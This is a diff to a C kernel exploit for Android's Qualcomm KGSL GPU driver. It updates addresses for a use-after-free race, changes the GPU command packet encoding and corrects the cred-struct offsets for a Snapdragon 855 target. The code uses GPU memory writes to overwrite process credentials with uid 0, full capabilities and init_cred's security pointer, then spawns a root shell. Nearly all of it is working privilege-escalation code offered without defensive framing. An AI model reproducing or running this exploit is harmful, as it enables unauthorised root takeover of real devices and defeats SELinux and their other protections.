@@ -70,17 +70,17 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define KGSL_CMDLIST_IB 0x00000001U
 #define KGSL_TIMESTAMP_RETIRED 0x00000002
 
-#define UAF_ADDR         0x60000000ULL
-#define UAF_SIZE         0x10000000ULL
-#define OVERLAP_ADDR     0x60001000ULL
-#define OVERLAP_SIZE     0x7000ULL
-#define BOGUS_ADDR       0x60002000ULL
-#define BOGUS_SIZE       0xffffffffffefd000ULL
-#define PLACEHOLDER_ADDR 0x61000000ULL
-#define PLACEHOLDER_SIZE 0x10000000ULL
+#define UAF_ADDR  0x7001ff000ULL
+#define UAF_SIZE  0x10004000ULL
+#define OVERLAP_ADDR 0x7001fe000ULL
+#define OVERLAP_SIZE 0x7000ULL
+#define BOGUS_ADDR 0x700204000ULL
+#define BOGUS_SIZE 0xffffffffffefd000ULL
+#define PLACEHOLDER_ADDR 0x710204000ULL
+#define PLACEHOLDER_SIZE 0x10400000ULL
 
 #define VMLINUX_TEXT      0xffffffc010080000ULL
-#define VMLINUX_INIT_CRED 0xffffffc012197d08ULL
+#define VMLINUX_INIT_CRED 0xffffffc012D97D08ULL
 #define VMLINUX_SELINUX_STATE 0xffffffc0123a4000ULL
 #define VMLINUX_SELINUX_ENFORCING_BOOT 0xffffffc01240744cULL
 
@@ -220,10 +220,13 @@ static int wait_timestamp(int fd, unsigned int ctx_id, unsigned int target) {
     return -2;
 }
 
-static uint32_t cp_type3_packet(uint32_t opcode, uint32_t cnt) {
-    return (3 << 30) | (((cnt - 1) & 0x3FFF) << 16) | ((opcode & 0xFF) << 8);
+static uint32_t pm4_parity(uint32_t v) {
+    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
 }
 
+static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
+    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
+}
 #define CP_NOP 0x10
 #define CP_MEM_WRITE 0x3D
 #define CP_MEM_TO_MEM 0x73
@@ -273,11 +276,8 @@ int main(int argc, char **argv) {
     printf("  init_cred=0x%lX\n", init_cred_addr);
 
     printf("[*] Phase 1: Setup rbtree\n");
-
     uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
     printf("  Using alloc_flags=0x%lx (WRITEBACK cache mode)\n", (unsigned long)alloc_flags);
-
-    munmap((void*)UAF_ADDR, UAF_SIZE);
     int uaf_id = gpuobj_alloc(kgsl_fd, UAF_SIZE, alloc_flags);
     void *uaf_m = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
         MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
@@ -287,18 +287,15 @@ int main(int argc, char **argv) {
     if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
         MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) die("mmap BOGUS");
 
-    munmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE);
     int ph_id = gpuobj_alloc(kgsl_fd, PLACEHOLDER_SIZE, alloc_flags);
     void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE,
         MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
     if (ph_m == MAP_FAILED) die("mmap PLACEHOLDER");
-
     printf("  UAF=0x%lx BOGUS=0x%lx PLACEHOLDER=0x%lx\n",
         (unsigned long)UAF_ADDR, (unsigned long)BOGUS_ADDR,
         (unsigned long)PLACEHOLDER_ADDR);
 
     printf("[*] Phase 2: Race\n");
-
     int ov_id = gpuobj_alloc(kgsl_fd, OVERLAP_SIZE, alloc_flags);
 
     pthread_t thr;
@@ -314,7 +311,6 @@ int main(int argc, char **argv) {
         if (e == ENODEV) { hit = 1; break; }
         if (i % 500000 == 0) printf("  race %d/%d errno=%d\n", i, 5000000, e);
     }
-
     race_done = 1;
     pthread_join(thr, NULL);
 
@@ -351,61 +347,57 @@ int main(int argc, char **argv) {
                 if (getuid() == 0) {
                     usleep(50000);
                     pid_t me = getpid();
-                    int fd = open("/proc/self/status", O_RDONLY);
-                        if (fd >= 0) {
-                            char buf[4096]; int n;
-                            while ((n = read(fd, buf, sizeof(buf))) > 0)
-                                write(1, buf, n);
-                            close(fd);
-                        }
-                        write(notify_pipe[1], &me, sizeof(me));
-                        write(1, "### ROOT SHELL ACTIVE ###\n", 26);
-                        close(notify_pipe[1]);
-                        usleep(50000);
-                        char buf[4096]; int n;
-                        fd = open("/proc/self/attr/current", O_RDONLY);
-                        if (fd >= 0) {
-                            write(1, "  SELinux: ", 11);
-                            while ((n = read(fd, buf, sizeof(buf))) > 0) write(1, buf, n);
-                            write(1, "\n", 1);
-                            close(fd);
-                        }
-                        int sec = prctl(PR_GET_SECCOMP, 0, 0, 0, 0);
-                        write(1, "  Seccomp: ", 11);
-                        char ebuf[32]; int elen = snprintf(ebuf, sizeof(ebuf), "%d\n", sec);
-                        write(1, ebuf, elen);
-                        int nnp = prctl(PR_GET_NO_NEW_PRIVS, 0, 0, 0, 0);
-                        write(1, "  NoNewPrivs: ", 15);
-                        elen = snprintf(ebuf, sizeof(ebuf), "%d\n", nnp);
-                        write(1, ebuf, elen);
-                        write(1, "  uid=", 6);
-                        elen = snprintf(ebuf, sizeof(ebuf), "%d euid=%d gid=%d egid=%d\n",
-                            getuid(), geteuid(), getgid(), getegid());
-                        write(1, ebuf, elen);
-                        fd = open("/proc/self/status", O_RDONLY);
-                        if (fd >= 0) {
-                            n = read(fd, buf, sizeof(buf)-1);
-                            close(fd);
-                            if (n > 0) {
-                                buf[n] = 0;
-                                char *lp = buf, *nl;
-                                while ((nl = strstr(lp, "\n")) != NULL) {
-                                    *nl = 0;
-                                    if (strncmp(lp, "CapPrm:", 7) == 0 || strncmp(lp, "CapEff:", 7) == 0 ||
-                                        strncmp(lp, "CapBnd:", 7) == 0 || strncmp(lp, "CapInh:", 7) == 0 ||
-                                        strncmp(lp, "Uid:", 4) == 0 || strncmp(lp, "Gid:", 4) == 0) {
-                                        write(1, "  ", 2); write(1, lp, nl - lp); write(1, "\n", 1);
-                                    }
-                                    lp = nl + 1;
+                    if (write(notify_pipe[1], &me, sizeof(me)) != sizeof(me)) {
+                        int fd = open("/data/local/tmp/rooted", O_CREAT|O_WRONLY, 0666);
+                        if (fd >= 0) { write(fd, "1", 1); close(fd); }
+                    }
+                    write(1, "### ROOT SHELL ACTIVE ###\n", 26);
+                    close(notify_pipe[1]);
+                    usleep(50000);
+                    char buf[4096]; int n;
+                    int fd = open("/proc/self/attr/current", O_RDONLY);
+                    if (fd >= 0) {
+                        write(1, "  SELinux: ", 11);
+                        while ((n = read(fd, buf, sizeof(buf))) > 0) write(1, buf, n);
+                        write(1, "\n", 1);
+                        close(fd);
+                    }
+                    int sec = prctl(PR_GET_SECCOMP, 0, 0, 0, 0);
+                    write(1, "  Seccomp: ", 11);
+                    char ebuf[32]; int elen = snprintf(ebuf, sizeof(ebuf), "%d\n", sec);
+                    write(1, ebuf, elen);
+                    int nnp = prctl(PR_GET_NO_NEW_PRIVS, 0, 0, 0, 0);
+                    write(1, "  NoNewPrivs: ", 15);
+                    elen = snprintf(ebuf, sizeof(ebuf), "%d\n", nnp);
+                    write(1, ebuf, elen);
+                    write(1, "  uid=", 6);
+                    elen = snprintf(ebuf, sizeof(ebuf), "%d euid=%d gid=%d egid=%d\n",
+                        getuid(), geteuid(), getgid(), getegid());
+                    write(1, ebuf, elen);
+                    fd = open("/proc/self/status", O_RDONLY);
+                    if (fd >= 0) {
+                        n = read(fd, buf, sizeof(buf)-1);
+                        close(fd);
+                        if (n > 0) {
+                            buf[n] = 0;
+                            char *lp = buf, *nl;
+                            while ((nl = strstr(lp, "\n")) != NULL) {
+                                *nl = 0;
+                                if (strncmp(lp, "CapPrm:", 7) == 0 || strncmp(lp, "CapEff:", 7) == 0 ||
+                                    strncmp(lp, "CapBnd:", 7) == 0 || strncmp(lp, "CapInh:", 7) == 0 ||
+                                    strncmp(lp, "Uid:", 4) == 0 || strncmp(lp, "Gid:", 4) == 0) {
+                                    write(1, "  ", 2); write(1, lp, nl - lp); write(1, "\n", 1);
                                 }
+                                lp = nl + 1;
                             }
                         }
-                        write(1, "  Spawning shell...\n", 20);
-                        execl("/system/bin/sh", "sh", NULL);
-                        write(1, "  sh exec failed: ", 18);
-                        elen = snprintf(ebuf, sizeof(ebuf), "%d\n", errno);
-                        write(1, ebuf, elen);
-                        _exit(0);
+                    }
+                    write(1, "  Spawning shell...\n", 20);
+                    execl("/system/bin/sh", "sh", NULL);
+                    write(1, "  sh exec failed: ", 18);
+                    elen = snprintf(ebuf, sizeof(ebuf), "%d\n", errno);
+                    write(1, ebuf, elen);
+                    _exit(0);
                 }
             }
             close(notify_pipe[1]);
@@ -418,7 +410,6 @@ int main(int argc, char **argv) {
     printf("  Spawned %d children\n", n_spray);
 
     printf("[*] Phase 7: GPU scan for task_structs\n");
-
     unsigned int ctx_id = create_context(kgsl_fd);
     printf("  context=%u\n", ctx_id);
 
@@ -460,17 +451,17 @@ int main(int argc, char **argv) {
         memset(ib_m, 0, 0x10000);
         memset(dst_m, 0, 0x1000);
         int dw = 0;
-        cmd[dw++] = cp_type3_packet(CP_NOP, 1); cmd[dw++] = 0;
+        cmd[dw++] = cp_type7(CP_NOP, 0);
         for (int i = 0; i < SCAN_DWORDS; i++) {
             uint32_t dl, dh, sl, sh;
             split64(dst_ga + i * 4, &dl, &dh);
             split64(va + i * 4, &sl, &sh);
-            cmd[dw++] = cp_type3_packet(CP_MEM_TO_MEM, 5);
+            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
             cmd[dw++] = 0;
             cmd[dw++] = dl; cmd[dw++] = dh;
             cmd[dw++] = sl; cmd[dw++] = sh;
         }
-        cmd[dw++] = cp_type3_packet(CP_NOP, 1); cmd[dw++] = 0;
+        cmd[dw++] = cp_type7(CP_NOP, 0);
         __sync_synchronize();
         unsigned int ts;
         if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
@@ -537,16 +528,16 @@ int main(int argc, char **argv) {
         memset(dst_m, 0, 0x1000);
         uint32_t *ccmd = (uint32_t *)ib_m;
         int cdw = 0;
-        ccmd[cdw++] = cp_type3_packet(CP_NOP, 1); ccmd[cdw++] = 0;
+        ccmd[cdw++] = cp_type7(CP_NOP, 0);
         for (int ci = 0; ci < 48; ci++) {
             uint32_t cdl, cdh, csl, csh;
             split64(dst_ga + ci * 4, &cdl, &cdh);
             split64(cred_pages[0] + cred_offs[0] + ci * 4, &csl, &csh);
-            ccmd[cdw++] = cp_type3_packet(CP_MEM_TO_MEM, 5);
+            ccmd[cdw++] = cp_type7(CP_MEM_TO_MEM, 5);
             ccmd[cdw++] = 0; ccmd[cdw++] = cdl; ccmd[cdw++] = cdh;
             ccmd[cdw++] = csl; ccmd[cdw++] = csh;
         }
-        ccmd[cdw++] = cp_type3_packet(CP_NOP, 1); ccmd[cdw++] = 0;
+        ccmd[cdw++] = cp_type7(CP_NOP, 0);
         __sync_synchronize();
         unsigned int cts;
         if (submit_ib(kgsl_fd, ctx_id, ib_ga, cdw*4, ib_id, &cts) == 0) {
@@ -576,16 +567,16 @@ int main(int argc, char **argv) {
             0xFFFFFF8000000000ULL,
         };
         uint32_t *tcmd = (uint32_t *)ib_m; int tdw = 0;
-        tcmd[tdw++] = cp_type3_packet(CP_NOP, 1); tcmd[tdw++] = 0;
+        tcmd[tdw++] = cp_type7(CP_NOP, 0);
         for (int i = 0; i < 4; i++) {
             uint32_t dl, dh, sl, sh;
             split64(dst_ga + i * 8, &dl, &dh);
             split64(test_vas[i], &sl, &sh);
-            tcmd[tdw++] = cp_type3_packet(CP_MEM_TO_MEM, 5);
+            tcmd[tdw++] = cp_type7(CP_MEM_TO_MEM, 5);
             tcmd[tdw++] = 0; tcmd[tdw++] = dl; tcmd[tdw++] = dh;
             tcmd[tdw++] = sl; tcmd[tdw++] = sh;
         }
-        tcmd[tdw++] = cp_type3_packet(CP_NOP, 1); tcmd[tdw++] = 0;
+        tcmd[tdw++] = cp_type7(CP_NOP, 0);
         __sync_synchronize();
         unsigned int tts;
         if (submit_ib(kgsl_fd, ctx_id, ib_ga, tdw*4, ib_id, &tts) == 0) {
@@ -608,16 +599,16 @@ int main(int argc, char **argv) {
         int dw = 0;
         memset(ib_m, 0, 0x10000);
         memset(dst_m, 0, 0x1000);
-        cmd[dw++] = cp_type3_packet(CP_NOP, 1); cmd[dw++] = 0;
+        cmd[dw++] = cp_type7(CP_NOP, 0);
         split64(dst_ga, &sl, &sh);
-        cmd[dw++] = cp_type3_packet(CP_MEM_WRITE, 4);
+        cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
         cmd[dw++] = sl; cmd[dw++] = sh;
         cmd[dw++] = 0xDEADBEEF; cmd[dw++] = 0xCAFEBABE;
         split64(dst_ga + 8, &sl, &sh);
-        cmd[dw++] = cp_type3_packet(CP_MEM_WRITE, 4);
+        cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
         cmd[dw++] = sl; cmd[dw++] = sh;
         cmd[dw++] = 0x12345678; cmd[dw++] = 0x9ABCDEF0;
-        cmd[dw++] = cp_type3_packet(CP_NOP, 1); cmd[dw++] = 0;
+        cmd[dw++] = cp_type7(CP_NOP, 0);
         __sync_synchronize();
         unsigned int ts;
         if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0) {
@@ -628,11 +619,12 @@ int main(int argc, char **argv) {
             printf("  DST[0]=0x%016llX DST[1]=0x%016llX coherency=%s\n",
                 (unsigned long long)v0, (unsigned long long)v1,
                 (v0 == 0xCAFEBABEDEADBEEFULL &&
-                 v1 == 0x9ABCDEF012345678ULL) ? "OK **UAF cred write should work**" :
+                 v1 == 0x9ABCDEF012345678ULL) ? "OK **UAF cred write should work**" : 
                  (v0 == 0 ? "FAIL (DST not written)" : "FAIL (wrong value)"));
         }
     }
 
+    // ===== Phase 8b: Direct cred overwrite (Snapdragon 855 オフセット修正版) =====
     if (n_cred > 0) {
         printf("[*] Phase 8b: Writing uid=0 + full caps to %d cred pages\n", n_cred);
         int n_ok = 0;
@@ -642,25 +634,27 @@ int main(int argc, char **argv) {
             uint32_t zl, zh, dl, dh, sl, sh;
             int dw;
 
+            // Read BEFORE (uid は cbase+0x10)
             memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
             dw = 0;
-            cmd[dw++] = cp_type3_packet(CP_NOP, 1); cmd[dw++] = 0;
+            cmd[dw++] = cp_type7(CP_NOP, 0);
             for (int ci = 0; ci < 48; ci++) {
                 split64(dst_ga + ci * 4, &dl, &dh);
                 split64(cbase + ci * 4, &sl, &sh);
-                cmd[dw++] = cp_type3_packet(CP_MEM_TO_MEM, 5);
+                cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
                 cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
                 cmd[dw++] = sl; cmd[dw++] = sh;
             }
-            cmd[dw++] = cp_type3_packet(CP_NOP, 1); cmd[dw++] = 0;
+            cmd[dw++] = cp_type7(CP_NOP, 0);
             __sync_synchronize();
             unsigned int ts;
             if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
                 wait_timestamp(kgsl_fd, ctx_id, ts);
             __sync_synchronize();
             uint32_t *bd = (uint32_t *)dst_m;
+            // uid は offset 0x10 → bd[4]
             printf("  cred[%d] BEFORE: security=0x%08X%08X uid=0x%08X\n",
-                p, bd[31], bd[30], bd[1]);
+                p, bd[31], bd[30], bd[4]);
 
             n_ok++;
 
@@ -668,31 +662,51 @@ int main(int argc, char **argv) {
                 printf("  Using init_cred->security = 0x%lX for cred[%d]\n",
                     (unsigned long)inc_sec, p);
                 split64(cbase + 0x78, &zl, &zh);
-                cmd[dw++] = cp_type3_packet(CP_MEM_WRITE, 4);
+                cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
                 cmd[dw++] = zl; cmd[dw++] = zh;
                 split64(inc_sec, &zl, &zh);
                 cmd[dw++] = zl; cmd[dw++] = zh;
             }
 
+            // 書き込み: オフセット 0x10 から 19 ワード
+            //   uid～fsgid (8ワード) を 0
+            //   securebits (0x30) = 0x00000004
+            //   CapInh (0x34-0x37) = 0x00000003ffffffff
+            //   CapPrm (0x3c-0x3f) = 0x00000003ffffffff
+            //   CapEff (0x44-0x47) = 0x00000003ffffffff
+            //   CapBset (0x4c-0x4f) = 0x00000003ffffffff
+            //   CapAmbient (0x54-0x57) = 0x00000003ffffffff
             memset(ib_m, 0, 0x10000);
             dw = 0;
-            split64(cbase + 0x04, &zl, &zh);
-            cmd[dw++] = cp_type3_packet(CP_MEM_WRITE, 21);
+            split64(cbase + 0x10, &zl, &zh);
+            cmd[dw++] = cp_type7(CP_MEM_WRITE, 19);
             cmd[dw++] = zl; cmd[dw++] = zh;
+
+            // 8 ワードの 0 (uid～fsgid)
             for (int i = 0; i < 8; i++) cmd[dw++] = 0;
+
+            // securebits (0x30)
             cmd[dw++] = 0x00000004;
-            cmd[dw++] = 0; cmd[dw++] = 0;
-            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
-            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
-            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x0000003F;
-            cmd[dw++] = 0; cmd[dw++] = 0;
+
+            // CapInh (0x34)
+            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
+            // CapPrm (0x3c)
+            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
+            // CapEff (0x44)
+            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
+            // CapBset (0x4c)
+            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
+            // CapAmbient (0x54)
+            cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0x00000003;
+
+            // Readback uid (cbase+0x10)
             memset(dst_m, 0, 0x1000);
             split64(dst_ga, &dl, &dh);
-            split64(cbase + 0x04, &sl, &sh);
-            cmd[dw++] = cp_type3_packet(CP_MEM_TO_MEM, 5);
+            split64(cbase + 0x10, &sl, &sh);
+            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
             cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
             cmd[dw++] = sl; cmd[dw++] = sh;
-            cmd[dw++] = cp_type3_packet(CP_NOP, 1); cmd[dw++] = 0;
+            cmd[dw++] = cp_type7(CP_NOP, 0);
             __sync_synchronize();
             if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
                 wait_timestamp(kgsl_fd, ctx_id, ts);
@@ -700,24 +714,28 @@ int main(int argc, char **argv) {
             uint32_t uid = *(volatile uint32_t*)dst_m;
             printf("  CRED[%d]: uid=0x%08X %s\n", p, uid,
                 uid == 0 ? "OK" : "FAIL");
+
+            // Force CPU cache flush for the modified cred page
+            flush_dc_civac_range((void*)cred_pages[p], 0x1000);
         }
         printf("  Phase 8b: %d creds updated\n", n_ok);
 
+        // Read cred page AFTER
         if (n_cred > 0) {
             printf("[*] Phase 8c: Dumping cred page AFTER write\n");
             memset(ib_m, 0, 0x10000); memset(dst_m, 0, 0x1000);
             uint32_t *ccmd = (uint32_t *)ib_m;
             int cdw = 0;
-            ccmd[cdw++] = cp_type3_packet(CP_NOP, 1); ccmd[cdw++] = 0;
+            ccmd[cdw++] = cp_type7(CP_NOP, 0);
             for (int ci = 0; ci < 48; ci++) {
                 uint32_t dl, dh, sl, sh;
                 split64(dst_ga + ci * 4, &dl, &dh);
                 split64(cred_pages[0] + cred_offs[0] + ci * 4, &sl, &sh);
-                ccmd[cdw++] = cp_type3_packet(CP_MEM_TO_MEM, 5);
+                ccmd[cdw++] = cp_type7(CP_MEM_TO_MEM, 5);
                 ccmd[cdw++] = 0; ccmd[cdw++] = dl; ccmd[cdw++] = dh;
                 ccmd[cdw++] = sl; ccmd[cdw++] = sh;
             }
-            ccmd[cdw++] = cp_type3_packet(CP_NOP, 1); ccmd[cdw++] = 0;
+            ccmd[cdw++] = cp_type7(CP_NOP, 0);
             __sync_synchronize();
             unsigned int cts;
             if (submit_ib(kgsl_fd, ctx_id, ib_ga, cdw*4, ib_id, &cts) == 0) {
@@ -730,7 +748,7 @@ int main(int argc, char **argv) {
                 }
                 printf("\n");
                 printf("  AFTER security=0x%08X%08X uid=0x%08X\n",
-                    cd[31], cd[30], cd[1]);
+                    cd[31], cd[30], cd[4]);
             }
         }
     }
@@ -750,11 +768,27 @@ int main(int argc, char **argv) {
     fflush(stdout);
 
     close(notify_pipe[1]);
-
+    sleep(1);
     struct pollfd pfd = { .fd = notify_pipe[0], .events = POLLIN };
     pid_t winner = 0;
-    if (poll(&pfd, 1, 10000) > 0 &&
-        read(notify_pipe[0], &winner, sizeof(winner)) == sizeof(winner)) {
+    ssize_t r = read(notify_pipe[0], &winner, sizeof(winner));
+    if (r != sizeof(winner)) {
+        if (poll(&pfd, 1, 10000) > 0 &&
+            read(notify_pipe[0], &winner, sizeof(winner)) == sizeof(winner)) {
+            // success
+        } else {
+            int fd = open("/data/local/tmp/rooted", O_RDONLY);
+            if (fd >= 0) {
+                char c;
+                if (read(fd, &c, 1) == 1 && c == '1') {
+                    winner = 1;
+                }
+                close(fd);
+            }
+        }
+    }
+
+    if (winner > 0) {
         printf("[+] ROOT! uid=0 at PID %d\n", winner);
         for (int i = 0; i < n_spray; i++)
             if (spray_pids[i] != winner) kill(spray_pids[i], SIGKILL);
